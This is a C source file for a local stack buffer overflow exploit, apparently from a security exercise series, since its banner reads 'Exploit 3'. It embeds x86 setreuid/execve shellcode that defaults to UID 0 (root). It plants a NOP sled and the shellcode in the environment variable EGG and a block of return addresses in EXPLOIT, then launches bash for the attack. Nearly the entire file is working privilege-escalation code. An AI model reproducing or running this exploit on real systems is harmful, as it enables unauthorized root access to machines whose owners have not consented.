#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define DEFAULT_BUFFER_SIZE 128
#define DEFAULT_STACK_OFFSET 512
#define DEFAULT_UID 0

#define VAR_SIZE 9
#define SPLIT_SIZE 32
#define EGG_SIZE 4098

char shellcode[] = 
  "\x55"
  "\x89\xe5"

  "\x31\xc0"
  "\x31\xdb"
  "\x31\xc9"
  "\xb0\x46"
  "\x66\xbb\xe9\x03" //adjust UID (0x03e9 = 1001)
  "\x66\xb9\xe9\x03" //adjust UID (0x03e9 = 1001)
  "\xcd\x80"

  "\x31\xc0"
  "\x50"
  "\x68\x2f\x2f\x73\x68"
  "\x68\x2f\x62\x69\x6e"
  "\x89\xe3"
  "\x31\xc9"
  "\x31\xd2"
  "\xb0\x0b"
  "\xcd\x80"
  ;

void print_info(int sp,int ret) {
  printf("#########################################################\n");
  printf("#                       Exploit 3                       #\n");
  printf("#########################################################\n");
  printf("# Usage: ./exploit1 STACK_OFFSET UID                    #\n");
  printf("#                                                       #\n");
  printf("# Payload in variable $EGG in the bottom of the stack   #\n");
  printf("# Payload address vector in variable $EXPLOIT           #\n");
  printf("#                                                       #\n");
  printf("# Default UID          :   0 (root)                     #\n");
  printf("# Default STACK_OFFSET : 512                            #\n");
  printf("#########################################################\n");
  printf("# PATH address        : 0x%x                      #\n",sp);
  printf("# Using return address: 0x%x                      #\n",ret);
  printf("#########################################################\n");
  printf("# Exploit locked and loaded!                            #\n");
  printf("#########################################################\n\n");
}

unsigned int getPath() {
  return (unsigned int) getenv("PATH");
}

int main(int argc, char* argv[]) {
  char* buffer;
  char env1[VAR_SIZE + SPLIT_SIZE + 1];
  char env2[VAR_SIZE + SPLIT_SIZE + 1];

  unsigned int buffer_size;
  unsigned int stack_offset;
  unsigned int shell_size;

  unsigned int uid;

  unsigned int sp;
  unsigned int return_addr;

  unsigned int* ret_buff;
  unsigned int ret_size;
  
  unsigned int i,j;

  sp = getPath();

  shell_size = strlen(shellcode);

  buffer_size = DEFAULT_BUFFER_SIZE;
  stack_offset = (argc >= 2) ? atoi(argv[1]) : DEFAULT_STACK_OFFSET;
  uid = (argc >=3) ? atoi(argv[2]) : DEFAULT_UID;

  return_addr = sp - stack_offset;

  buffer = (char*) malloc(sizeof(char)*(buffer_size));

  /* Return Address */
  ret_buff = (unsigned int*) buffer;
  ret_size = buffer_size/4;
  for (i=0;i<ret_size;i++)
    ret_buff[i] = return_addr;

  /* set the return vector */
  setenv("EXPLOIT",buffer,1);

  free(buffer);
  buffer_size = EGG_SIZE;
  buffer = (char*) malloc(sizeof(char)*buffer_size);

  /* NOP slide */
  for (i=0;i<buffer_size - shell_size - 1;i++)
    buffer[i] = 0x90;

  /* Shellcode */
  if (uid == 0) {
    for (j=0;j<11;j++,i++)
      buffer[i] = shellcode[j];

    for (j+=8;j<shell_size;j++,i++)
      buffer[i] = shellcode[j];
  } else {
    char* uid_array = (char*) &uid;
    shellcode[13] = uid_array[0];
    shellcode[14] = uid_array[1];

    shellcode[17] = uid_array[0];
    shellcode[18] = uid_array[1];

    for (j=0;j<shell_size;j++,i++)
      buffer[i] = shellcode[j];
  }

  setenv("EGG",buffer,1);

  print_info(sp,return_addr);

  system("/bin/bash");

  free(buffer);
}
